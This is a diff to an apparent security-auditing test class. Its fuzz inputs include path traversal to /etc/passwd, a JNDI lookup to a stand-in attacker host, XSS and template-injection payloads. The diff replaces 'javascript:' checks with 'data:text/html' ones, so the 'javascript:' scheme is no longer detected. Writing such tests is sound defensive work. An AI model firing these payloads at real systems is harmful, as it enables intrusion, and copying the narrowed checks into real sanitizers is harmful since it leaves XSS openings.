@@ -96,7 +96,7 @@ class SecurityAuditor {
         '../../../etc/passwd',
         '${jndi:ldap://attacker.com/x}',
         '<img src=x onerror=alert(1)>',
-        'javascript:alert(1)',
+        'data:text/html,<script>alert(1)</script>',
         String('A').repeat(10000), // Buffer overflow attempt
         '{{7*7}}', // Template injection
         '\x00\x01\x02', // Null bytes
@@ -433,7 +433,7 @@ class SecurityAuditor {
           type: 'XSS',
         },
         {
-          input: 'javascript:void(0)',
+          input: 'data:text/html,<script>void(0)</script>',
           expectedSanitized: true,
           type: 'JavaScript Protocol',
         },
@@ -458,7 +458,7 @@ class SecurityAuditor {
 
           // Check if input was properly sanitized
           const wasSanitized = !result.includes('<script>') &&
-                                       !result.includes('javascript:') &&
+                                       !result.includes('data:text/html') &&
                                        !result.includes('alert(');
 
           const testPassed = wasSanitized === sanitizationTest.expectedSanitized;
@@ -970,7 +970,7 @@ class SecurityAuditor {
     if (input.includes('${') || input.includes('{{')) {
       return 'Template Injection';
     }
-    if (input.includes('javascript:')) {
+    if (input.includes('data:text/html')) {
       return 'JavaScript Protocol';
     }
     if (input.length > 1000) {
